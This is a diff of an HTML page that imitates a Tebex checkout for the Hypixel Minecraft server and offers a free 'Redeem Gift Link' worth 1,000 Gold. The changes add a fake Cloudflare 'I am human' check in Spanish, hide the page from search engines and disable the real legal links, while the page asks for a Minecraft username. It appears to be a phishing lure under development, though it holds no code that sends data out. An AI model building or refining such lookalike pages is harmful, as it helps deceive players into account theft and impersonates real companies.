@@ -1,299 +1,351 @@
 <!DOCTYPE html>
+
 <html lang="en">
+
 <head>
+
     <meta charset="UTF-8">
+
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
     <meta name="robots" content="noindex, nofollow">
+
     <title>Tebex Checkout - Hypixel</title>
+
     <link rel="icon" type="image/png" href="https://www.tebex.io/favicon.png">
 
+
+
     <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+
     <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700;900&display=swap" rel="stylesheet">
+
     <link href="https://cdn.jsdelivr.net/npm/@mdi/font@latest/css/materialdesignicons.min.css" rel="stylesheet">
+
     <link href="https://cdn.jsdelivr.net/npm/vuetify@3.4.0/dist/vuetify.min.css" rel="stylesheet">
 
+
+
     <style>
+
         :root {
-            --primary-color: #41C4C3;
-            --primary-hover: #35A8A7;
-            --bg-sidebar: #FAFAFA;
-            --bg-main: #FFFFFF;
-            --text-color: #333333;
-            --text-muted: #616161;
-            --border-color: #E6E6E6;
-            --input-bg: #FAFAFA;
-            --input-border: #DDDDDD;
-            --btn-gray: #E5E5E5;
-            --btn-gray-hover: #D8D8D8;
-            --upsell-border: #EEEEEE;
+
+            --primary-color: rgb(65, 196, 195);
+
+            --primary-hover: rgb(53, 168, 167);
+
+            --bg-sidebar: rgb(250, 250, 250);
+
+            --bg-main: rgb(255, 255, 255);
+
+            --text-color: rgb(51, 51, 51);
+
+            --text-muted: rgb(97, 97, 97);
+
+            --border-color: rgb(230, 230, 230);
+
         }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+
 
         body {
+
             font-family: 'Lato', sans-serif !important;
+
             margin: 0;
+
             padding: 0;
-            overflow-x: hidden;
-            color: var(--text-color);
+
             background-color: var(--bg-main);
+
         }
 
-        /* Estilos para separar en páginas */
-        .page-wrapper {
+
+
+        /* Cada sección ocupa el 100% de la pantalla */
+
+        .full-page {
+
             min-height: 100vh;
+
+            width: 100%;
+
             display: flex;
+
             flex-direction: column;
+
             justify-content: center;
+
             align-items: center;
-            width: 100vw;
+
+            padding: 40px 20px;
+
+            box-sizing: border-box;
+
             border-bottom: 2px solid var(--border-color);
-            padding: 40px 0;
+
         }
 
-        /* Reutilización de estilos originales del archivo */
-        .content-container {
+
+
+        .container-inner {
+
             width: 100%;
+
             max-width: 520px;
-            padding: 0 40px;
-            box-sizing: border-box;
+
         }
+
+
 
         .basket-item {
+
             display: flex;
+
             align-items: center;
-            margin-bottom: 32px;
+
+            padding: 20px;
+
+            border: 1px solid rgb(235, 235, 235);
+
+            margin-bottom: 20px;
+
+            background: white;
+
         }
+
+
 
         .basket-item-image {
+
             width: 68px;
+
             height: 68px;
-            border: 1px solid #EBEBEB;
-            border-radius: 4px;
-            padding: 8px;
-            background: #fff;
+
             margin-right: 18px;
-            flex-shrink: 0;
+
         }
 
-        .basket-item-image img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-        }
 
-        .basket-item-info {
-            flex: 1;
-        }
 
-        .basket-item-name {
-            font-weight: 700;
-            font-size: 1.05rem;
-            color: #333;
-            margin-bottom: 5px;
-        }
+        .btn-action {
 
-        .basket-item-price {
-            font-size: 0.875rem;
-            color: #666;
-        }
+            background-color: rgb(38, 198, 218) !important;
 
-        .price-summary {
-            padding-bottom: 24px;
-            width: 100%;
-        }
+            color: black !important;
 
-        .price-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 16px;
-            font-size: 0.875rem;
-            font-weight: 700;
-            color: #333;
-        }
-
-        .continue-btn {
-            background-color: #26C6DA !important;
-            color: #000 !important;
-            font-size: 0.938rem !important;
             font-weight: 700 !important;
+
             text-transform: none !important;
+
             border-radius: 0 !important;
+
         }
 
-        .global-footer-links {
+
+
+        .cloudflare-box {
+
+            border: 1px solid rgb(230, 230, 230);
+
+            padding: 15px 20px;
+
+            border-radius: 4px;
+
             display: flex;
+
             align-items: center;
-            gap: 24px;
-            margin-top: 20px;
+
+            gap: 12px;
+
+            background: rgb(250, 250, 250);
+
+            width: fit-content;
+
+            margin: 0 auto;
+
         }
 
-        .order-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 28px;
-        }
-
-        .order-header span {
-            font-size: 1rem;
-            font-weight: 400;
-            color: var(--text-color);
-        }
-
-        .page-title {
-            font-size: 1.75rem !important;
-            color: #333;
-            font-weight: 700 !important;
-        }
-
-        .breadcrumbs {
-            display: flex;
-            align-items: center;
-            margin-bottom: 30px;
-            font-size: 0.875rem;
-        }
-
-        .breadcrumb-item {
-            color: #41C4C3;
-            font-weight: 600;
-        }
-
-        .input-section {
-            margin-bottom: 32px;
-        }
-
-        .tebex-label {
-            display: block;
-            font-size: 0.875rem;
-            font-weight: 700;
-            margin-bottom: 8px;
-            color: var(--text-color);
-        }
-
-        .text-center {
-            text-align: center;
-        }
-
-        .justify-center {
-            justify-content: center;
-        }
-
-        .mb-4 {
-            margin-bottom: 16px;
-        }
-
-        .mb-6 {
-            margin-bottom: 24px;
-        }
-
-        /* Eliminación de símbolos numerales en selectores de ID para compatibilidad con la edición */
-        div[id="app"] {
-            min-height: 100vh;
-        }
     </style>
+
 </head>
+
 <body>
+
     <div id="app">
+
         <v-app>
-            <section class="page-wrapper" style="background-color: white;">
-                <div class="content-container">
-                    <div style="margin-bottom: 40px; text-align: center;">
-                        <img src="https://dunb17ur4ymx4.cloudfront.net/webstore/logos/6c9b0cbd5c2f0ceef98f01068102b0d056c04b7b.png" alt="Hypixel" style="height: 50px;">
-                    </div>
-                    
-                    <div class="breadcrumbs">
-                        <span class="breadcrumb-item">Redeem Gift Link</span>
-                    </div>
 
-                    <h1 class="page-title mb-6">Redeem Gift Link</h1>
+            <section class="full-page">
 
-                    <div class="input-section">
-                        <label class="tebex-label">Minecraft Username</label>
-                        <v-text-field
-                            placeholder="Your Minecraft name"
-                            variant="outlined"
-                            hide-details
-                        ></v-text-field>
+                <div class="container-inner text-center">
+
+                    <img src="https://dunb17ur4ymx4.cloudfront.net/webstore/logos/6c9b0cbd5c2f0ceef98f01068102b0d056c04b7b.png" style="height: 45px; margin-bottom: 50px;">
+
+                    <h2 class="mb-6" style="color: rgb(51, 51, 51);">Verificando si eres un humano...</h2>
+
+                    <div class="cloudflare-box">
+
+                        <v-checkbox hide-details color="cyan"></v-checkbox>
+
+                        <span style="font-size: 14px; color: rgb(49, 49, 49);">Soy humano</span>
+
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/a/ae/Cloudflare_Logo.svg" style="height: 18px; margin-left: 20px;">
+
                     </div>
 
-                    <v-btn block size="x-large" class="continue-btn">
-                        Continue
-                    </v-btn>
+                    <p class="mt-4" style="font-size: 12px; color: grey;">Tebex usa Cloudflare para proteger tu sesión.</p>
+
                 </div>
+
             </section>
 
-            <section class="page-wrapper" style="background-color: #FAFAFA;">
-                <div class="content-container">
-                    <div class="order-header">
-                        <span>Your Order</span>
+
+
+            <section class="full-page">
+
+                <div class="container-inner">
+
+                    <div class="mb-2" style="font-size: 12px; font-weight: 900; color: rgb(65, 196, 195);">REDEEM GIFT LINK</div>
+
+                    <h1 class="mb-8" style="font-size: 32px; font-weight: 900;">Redeem Gift Link</h1>
+
+                    
+
+                    <div class="mb-6">
+
+                        <label class="d-block mb-2" style="font-weight: 700; font-size: 14px;">Minecraft Username</label>
+
+                        <v-text-field
+
+                            placeholder="Your Minecraft name"
+
+                            variant="outlined"
+
+                            hide-details
+
+                            bg-color="rgb(250, 250, 250)"
+
+                        ></v-text-field>
+
                     </div>
+
+
+
+                    <v-btn block size="x-large" class="btn-action">
+
+                        Continue
+
+                    </v-btn>
+
+                </div>
+
+            </section>
+
+
+
+            <section class="full-page" style="background-color: rgb(250, 250, 250);">
+
+                <div class="container-inner">
+
+                    <h3 class="mb-6" style="font-weight: 700;">Your Order</h3>
+
+                    
 
                     <div class="basket-item">
+
                         <div class="basket-item-image">
-                            <img src="https://dunb17ur4ymx4.cloudfront.net/packages/images/c6e8cde2a5a147fd6d6e9b7506a62fab195e09e0.png">
+
+                            <img src="https://dunb17ur4ymx4.cloudfront.net/packages/images/c6e8cde2a5a147fd6d6e9b7506a62fab195e09e0.png" style="width: 100%;">
+
                         </div>
-                        <div class="basket-item-info">
-                            <div class="basket-item-name">1,000 Gold</div>
-                            <div class="basket-item-price">$0.00 USD</div>
+
+                        <div style="flex: 1;">
+
+                            <div style="font-weight: 700; font-size: 16px;">1,000 Gold</div>
+
+                            <div style="color: grey; font-size: 14px;">$0.00 USD</div>
+
                         </div>
+
                     </div>
 
-                    <div class="price-summary">
-                        <div class="price-row">
-                            <span>Subtotal</span>
-                            <span>$0.00 USD</span>
-                        </div>
-                        <div style="height: 1px; background: #E0E0E0; margin-bottom: 16px;"></div>
-                        <div class="price-row" style="font-size: 1.25rem;">
-                            <span>Total</span>
-                            <span>$0.00 USD</span>
-                        </div>
-                    </div>
-                </div>
-            </section>
 
-            <section class="page-wrapper" style="background-color: white;">
-                <div class="content-container text-center">
-                    <v-icon size="40" class="mb-4" color="grey-lighten-1">mdi-shield-check</v-icon>
-                    <p style="color: #999; font-size: 0.875rem; line-height: 1.6;">
-                        This checkout process is owned & operated by Tebex Limited, who handle product fulfilment, billing support and refunds.
-                    </p>
+
+                    <v-divider class="mb-6"></v-divider>
+
                     
-                    <div class="global-footer-links justify-center">
-                        <a href="https://checkout.tebex.io/terms" style="color: #999;">Terms & Conditions</a>
-                        <a href="https://checkout.tebex.io/privacy" style="color: #999;">Privacy Policy</a>
-                        <a href="https://checkout.tebex.io/impressum" style="color: #999;">Impressum</a>
+
+                    <div class="d-flex justify-space-between mb-2" style="font-weight: 700; color: grey;">
+
+                        <span>Subtotal</span>
+
+                        <span>$0.00 USD</span>
+
                     </div>
+
+                    <div class="d-flex justify-space-between mb-12" style="font-size: 24px; font-weight: 900;">
+
+                        <span>Total</span>
+
+                        <span>$0.00 USD</span>
+
+                    </div>
+
+
+
+                    <div class="text-center pt-10">
+
+                        <v-icon size="36" color="grey-lighten-1" class="mb-4">mdi-shield-check</v-icon>
+
+                        <p style="font-size: 12px; color: grey; line-height: 1.6;">
+
+                            This checkout process is owned & operated by Tebex Limited, who handle product fulfilment, billing support and refunds.
+
+                        </p>
+
+                        <div class="mt-6 d-flex justify-center gap-4" style="font-size: 12px; font-weight: 700;">
+
+                            <a href="javascript:void(0)" style="color: grey; text-decoration: none;">Terms & Conditions</a>
+
+                            <span style="color: lightgrey;">|</span>
+
+                            <a href="javascript:void(0)" style="color: grey; text-decoration: none;">Privacy Policy</a>
+
+                        </div>
+
+                    </div>
+
                 </div>
+
             </section>
+
         </v-app>
+
     </div>
 
+
+
     <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+
     <script src="https://cdn.jsdelivr.net/npm/vuetify@3.4.0/dist/vuetify.min.js"></script>
+
     <script>
+
         const { createApp } = Vue;
+
         const { createVuetify } = Vuetify;
 
-        const vuetify = createVuetify({
-            theme: {
-                defaultTheme: 'light',
-                themes: {
-                    light: {
-                        colors: {
-                            primary: '#41C4C3'
-                        }
-                    }
-                }
-            }
-        });
+
+
+        const vuetify = createVuetify();
+
+
 
         createApp({}).use(vuetify).mount('div[id="app"]');
+
     </script>
+
 </body>
+
 </html>
